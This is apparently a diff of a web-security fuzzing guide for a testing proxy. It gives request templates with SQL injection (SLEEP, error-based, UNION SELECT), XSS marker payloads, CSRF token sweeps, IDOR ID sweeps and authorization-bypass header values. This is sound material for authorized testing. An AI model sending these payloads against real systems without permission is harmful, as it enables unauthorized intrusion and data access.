@@ -43,41 +43,45 @@ Replace with another user's ID and determine success/failure from status code an
 
 ### Payload Position
 
+Body JSON field (use `body_patches` translated into individual payload values, or vary the entire body):
+
 ```json
+// fuzz_http — vary the JSON body for an IDOR sweep
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "body_json",
-      "json_path": "$.user_id",
-      "payload_set": "user-ids"
+      "path": "body",
+      "payloads": [
+        "{\"user_id\": 1}",
+        "{\"user_id\": 2}",
+        "{\"user_id\": 3}",
+        "{\"user_id\": 999}"
+      ]
     }
   ],
-  "payload_sets": {
-    "user-ids": {
-      "type": "range",
-      "start": 1,
-      "end": 20
-    }
-  }
+  "tag": "idor-body-sweep"
 }
 ```
 
-For PATH parameters:
+For path parameters, vary the request path directly:
 
 ```json
+// fuzz_http — vary the path for an IDOR sweep
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "path",
-      "match": "/users/(\\d+)",
-      "payload_set": "user-ids"
+      "path": "path",
+      "payloads": [
+        "/users/1",
+        "/users/2",
+        "/users/3",
+        "/users/999"
+      ]
     }
   ],
-  "payload_sets": {
-    "user-ids": {"type": "range", "start": 1, "end": 20}
-  }
+  "tag": "idor-path-sweep"
 }
 ```
 
@@ -96,29 +100,24 @@ Use SLEEP-based payloads to observe differences in duration_ms.
 ### Payloads
 
 ```json
+// fuzz_http — vary the body around a SQL-injection sink
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "body_json",
-      "json_path": "$.search",
-      "payload_set": "sqli"
-    }
-  ],
-  "payload_sets": {
-    "sqli": {
-      "type": "wordlist",
-      "values": [
-        "normalvalue",
-        "' OR SLEEP(3)-- ",
-        "' OR SLEEP(3)#",
-        "1 OR SLEEP(3)",
-        "1; WAITFOR DELAY '0:0:3'--",
-        "1' AND (SELECT SLEEP(3))-- ",
-        "1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)"
+      "path": "body",
+      "payloads": [
+        "{\"search\": \"normalvalue\"}",
+        "{\"search\": \"' OR SLEEP(3)-- \"}",
+        "{\"search\": \"' OR SLEEP(3)#\"}",
+        "{\"search\": \"1 OR SLEEP(3)\"}",
+        "{\"search\": \"1; WAITFOR DELAY '0:0:3'--\"}",
+        "{\"search\": \"1' AND (SELECT SLEEP(3))-- \"}",
+        "{\"search\": \"1 AND (SELECT 1 FROM (SELECT SLEEP(3))a)\"}"
       ]
     }
-  }
+  ],
+  "tag": "sqli-time-based"
 }
 ```
 
@@ -126,18 +125,7 @@ Use SLEEP-based payloads to observe differences in duration_ms.
 
 - Record `normalvalue` duration_ms as baseline
 - SLEEP payloads increase duration_ms by ~3000ms → SQLi vulnerability present
-- Check fuzz_results with `sort_by: "duration_ms"`
-- To configure automatic stop with `stop_on`:
-
-```json
-{
-  "stop_on": {
-    "latency_threshold_ms": 5000,
-    "latency_baseline_multiplier": 3.0,
-    "latency_window": 5
-  }
-}
-```
+- Inspect outliers via `query { resource: "fuzz_results", filter: { fuzz_id: ..., outliers_only: true } }`
 
 ## SQL Injection (Error-based)
 
@@ -149,30 +137,25 @@ No data is modified whatsoever, so **this is safe to use on methods with side ef
 ### Payloads
 
 ```json
+// fuzz_http — vary the body around an error-based SQL-injection sink
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "body_json",
-      "json_path": "$.search",
-      "payload_set": "sqli-error"
-    }
-  ],
-  "payload_sets": {
-    "sqli-error": {
-      "type": "wordlist",
-      "values": [
-        "normalvalue",
-        "'",
-        "''",
-        "'\"",
-        "1'",
-        "1 AND 'a'='b",
-        "1' AND 'a'='b",
-        "1\" AND \"a\"=\"b"
+      "path": "body",
+      "payloads": [
+        "{\"search\": \"normalvalue\"}",
+        "{\"search\": \"'\"}",
+        "{\"search\": \"''\"}",
+        "{\"search\": \"'\\\"\"}",
+        "{\"search\": \"1'\"}",
+        "{\"search\": \"1 AND 'a'='b\"}",
+        "{\"search\": \"1' AND 'a'='b\"}",
+        "{\"search\": \"1\\\" AND \\\"a\\\"=\\\"b\"}"
       ]
     }
-  }
+  ],
+  "tag": "sqli-error-based"
 }
 ```
 
@@ -195,52 +178,42 @@ Retrieve information using UNION SELECT. Identify the number of columns and veri
 **Step 1: Identify Column Count (ORDER BY)**
 
 ```json
+// fuzz_http — vary raw_query for the ORDER BY column-count probe
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "query",
-      "name": "id",
-      "payload_set": "orderby"
-    }
-  ],
-  "payload_sets": {
-    "orderby": {
-      "type": "wordlist",
-      "values": [
-        "1 ORDER BY 1-- ",
-        "1 ORDER BY 2-- ",
-        "1 ORDER BY 3-- ",
-        "1 ORDER BY 5-- ",
-        "1 ORDER BY 10-- ",
-        "1 ORDER BY 20-- "
+      "path": "raw_query",
+      "payloads": [
+        "id=1 ORDER BY 1-- ",
+        "id=1 ORDER BY 2-- ",
+        "id=1 ORDER BY 3-- ",
+        "id=1 ORDER BY 5-- ",
+        "id=1 ORDER BY 10-- ",
+        "id=1 ORDER BY 20-- "
       ]
     }
-  }
+  ],
+  "tag": "sqli-union-orderby"
 }
 ```
 
 **Step 2: UNION SELECT (after confirming column count)**
 
 ```json
+// fuzz_http — vary raw_query for UNION SELECT
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "query",
-      "name": "id",
-      "payload_set": "union"
-    }
-  ],
-  "payload_sets": {
-    "union": {
-      "type": "wordlist",
-      "values": [
-        "1 UNION SELECT NULL,NULL,NULL-- ",
-        "0 UNION SELECT NULL,NULL,NULL-- "
+      "path": "raw_query",
+      "payloads": [
+        "id=1 UNION SELECT NULL,NULL,NULL-- ",
+        "id=0 UNION SELECT NULL,NULL,NULL-- "
       ]
     }
-  }
+  ],
+  "tag": "sqli-union-select"
 }
 ```
 
@@ -259,36 +232,31 @@ Send harmless marker-tagged payloads and check whether escaping occurs in the re
 ### Payloads
 
 ```json
+// fuzz_http — vary raw_query against a reflected-XSS sink
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "query",
-      "name": "q",
-      "payload_set": "xss"
-    }
-  ],
-  "payload_sets": {
-    "xss": {
-      "type": "wordlist",
-      "values": [
-        "YP_NORMAL_TEXT",
-        "<YP_TAG>test</YP_TAG>",
-        "<img src=x onerror=YP_XSS>",
-        "'\"><YP_TAG>",
-        "javascript:YP_XSS",
-        "<svg/onload=YP_XSS>",
-        "{{YP_TEMPLATE}}",
-        "§YP_TEMPLATE§"
+      "path": "raw_query",
+      "payloads": [
+        "q=YP_NORMAL_TEXT",
+        "q=<YP_TAG>test</YP_TAG>",
+        "q=<img src=x onerror=YP_XSS>",
+        "q='\"><YP_TAG>",
+        "q=javascript:YP_XSS",
+        "q=<svg/onload=YP_XSS>",
+        "q={{YP_TEMPLATE}}",
+        "q=§YP_TEMPLATE§"
       ]
     }
-  }
+  ],
+  "tag": "xss-reflected"
 }
 ```
 
 **Note**: The `YP_` prefix is an identification marker for YoriShiro-Proxy testing.
 No actual script execution occurs. `§YP_TEMPLATE§` is a payload for detecting
-macro KVS template syntax injection. The fuzzer engine does not apply template expansion
+macro KVS template syntax injection. The fuzz_http engine does not apply template expansion
 to payload values, so it is sent as a literal string.
 
 ### Evaluation
@@ -306,71 +274,48 @@ Replace/empty/substitute another session's CSRF token to verify request acceptan
 
 ### Payloads
 
+The captured flow's headers list contains `X-CSRF-Token`. Identify the header index `N` from the recorded `headers[]` array (e.g. via `query { resource: "flow", id: "<flow-id>" }`) and fuzz that slot's `value`:
+
 ```json
+// fuzz_http — vary the CSRF token at headers[N].value
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "header",
-      "name": "X-CSRF-Token",
-      "payload_set": "csrf-tokens"
-    }
-  ],
-  "payload_sets": {
-    "csrf-tokens": {
-      "type": "wordlist",
-      "values": [
+      "path": "headers[N].value",
+      "payloads": [
         "",
         "invalid-token-value",
         "00000000-0000-0000-0000-000000000000"
       ]
     }
-  }
+  ],
+  "tag": "csrf-token-sweep"
 }
 ```
 
-Test by removing the header entirely:
-
-```json
-{
-  "positions": [
-    {
-      "id": "pos-0",
-      "location": "header",
-      "name": "X-CSRF-Token",
-      "mode": "remove",
-      "payload_set": "unused"
-    }
-  ]
-}
-```
+To test removing the header entirely, do a single `resend_http` call with the recorded headers array minus the `X-CSRF-Token` entry. (`fuzz_http` positions can replace a value but cannot delete a slot — use `resend_http` for the "no header at all" case.)
 
 ### Evaluation
 
 - Request succeeds (200/302) with invalid/empty/removed token → No CSRF protection
 - 403/400 → CSRF protection is functioning
-- Test cookie-based CSRF tokens similarly (location: `cookie`)
+- Test cookie-based CSRF tokens similarly by fuzzing the `Cookie` header's `headers[N].value` slot
 
 ## Authentication & Authorization Testing
 
 ### Authentication Bypass
 
-Manipulate the Authorization header:
+Manipulate the `Authorization` header. Identify its index `N` in the recorded `headers[]` array first, then fuzz the value at that slot:
 
 ```json
+// fuzz_http — vary the Authorization header value
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "header",
-      "name": "Authorization",
-      "payload_set": "auth-bypass"
-    }
-  ],
-  "payload_sets": {
-    "auth-bypass": {
-      "type": "wordlist",
-      "values": [
+      "path": "headers[N].value",
+      "payloads": [
         "",
         "Bearer ",
         "Bearer invalid",
@@ -378,7 +323,8 @@ Manipulate the Authorization header:
         "Basic YWRtaW46YWRtaW4="
       ]
     }
-  }
+  ],
+  "tag": "auth-bypass"
 }
 ```
 
@@ -387,45 +333,36 @@ Manipulate the Authorization header:
 Access admin APIs with a low-privilege user's token:
 
 ```json
-// resend
+// resend_http
 {
-  "action": "resend",
-  "params": {
-    "flow_id": "<admin-api-flow-id>",
-    "override_headers": {
-      "Authorization": "Bearer <low-privilege-user-token>"
-    },
-    "tag": "authz-test-low-priv"
-  }
+  "flow_id": "<admin-api-flow-id>",
+  "headers": [
+    {"name": "Authorization", "value": "Bearer <low-privilege-user-token>"}
+  ],
+  "tag": "authz-test-low-priv"
 }
 ```
 
-### Role Downgrade Testing (fuzz)
+### Role Downgrade Testing (fuzz_http)
 
-Test the same API with tokens from multiple roles:
+Test the same API with tokens from multiple roles. Identify the `Authorization` header's index `N` in the recorded `headers[]` array, then substitute the full header value (including the `Bearer ` prefix) per variant:
 
 ```json
+// fuzz_http — vary the Authorization header value across roles
 {
+  "flow_id": "<target-flow-id>",
   "positions": [
     {
-      "id": "pos-0",
-      "location": "header",
-      "name": "Authorization",
-      "match": "Bearer (.*)",
-      "payload_set": "role-tokens"
-    }
-  ],
-  "payload_sets": {
-    "role-tokens": {
-      "type": "wordlist",
-      "values": [
-        "<admin-token>",
-        "<editor-token>",
-        "<viewer-token>",
-        "<guest-token>"
+      "path": "headers[N].value",
+      "payloads": [
+        "Bearer <admin-token>",
+        "Bearer <editor-token>",
+        "Bearer <viewer-token>",
+        "Bearer <guest-token>"
       ]
     }
-  }
+  ],
+  "tag": "role-downgrade"
 }
 ```
 
@@ -433,23 +370,23 @@ Test the same API with tokens from multiple roles:
 
 - Low-privilege/unauthenticated access to admin API returns 200 → Auth/authz bypass
 - 401/403 → Properly protected
-- Sort fuzz_results by `status_code` and check results returning 200
+- Inspect `query { resource: "fuzz_results", filter: { fuzz_id: ..., status_code: 200 } }` for accepted payloads
 
-## Payload Position (location) Reference
+## fuzz_http Position Path Reference
 
-| location | Use Case | Required Parameters |
-|----------|----------|---------------------|
-| `header` | Replace HTTP header value | `name` (header name) |
-| `query` | Replace query parameter | `name` (parameter name) |
-| `body_json` | Replace JSON body value | `json_path` (JSONPath) |
-| `body_regex` | Replace regex-matched part of body | `match` (regex) |
-| `path` | Replace part of URL path | `match` (regex) |
-| `cookie` | Replace Cookie value | `name` (Cookie name) |
+Typed paths accepted by `fuzz_http.positions[].path`:
 
-## mode Options
-
-| mode | Behavior |
+| Path | Use Case |
 |------|----------|
-| `replace` | Replace existing value with payload (default) |
-| `add` | Append payload |
-| `remove` | Delete the parameter itself |
+| `method` | Replace HTTP method (GET, POST, PUT, ...) |
+| `scheme` | Replace request scheme (http or https) |
+| `authority` | Replace Host / :authority |
+| `path` | Replace the request path |
+| `raw_query` | Replace the raw query string (no leading `?`) |
+| `body` | Replace the request body (interpret per `encoding`) |
+| `headers[N].name` | Replace the Nth header's name (N indexes the input `headers[]` array) |
+| `headers[N].value` | Replace the Nth header's value |
+
+Each position payload is interpreted per the position's `encoding` field (`text` default, or `base64` for binary content). To delete a header slot entirely, issue a `resend_http` call with the recorded headers array minus that entry — `fuzz_http` cannot remove slots.
+
+For non-HTTP envelopes, see the typed fuzz siblings: `fuzz_ws` (`payload`, `close_reason`), `fuzz_grpc` (`service`, `method`, `metadata[N].name`, `metadata[N].value`, `messages[N].payload`), `fuzz_raw` (`payload`, `patches[N].data`).
